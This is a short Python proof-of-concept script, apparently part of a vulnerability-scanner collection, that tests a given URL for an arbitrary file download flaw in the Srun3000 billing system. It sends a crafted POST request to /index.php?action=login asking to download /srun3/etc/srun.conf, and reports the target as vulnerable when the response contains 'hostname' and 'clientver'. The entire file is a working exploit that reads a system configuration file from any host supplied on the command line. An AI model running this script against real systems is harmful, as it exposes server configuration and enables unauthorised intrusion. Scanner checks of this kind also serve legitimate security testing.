#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 深澜软件srun3000计费系统任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-067666
author: Lucifer
description: srun3000 8080端口文件index.php中,post参数ts=download&file=/srun3/etc/srun.conf导致任意文件下载。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class srun_index_file_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "ts":"download",
            "file":"/srun3/etc/srun.conf"
        }
        payload = "/index.php?action=login"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"hostname" in req.text and r"clientver" in req.text:
                cprint("[+]存在深澜软件srun3000计费系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = srun_index_file_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()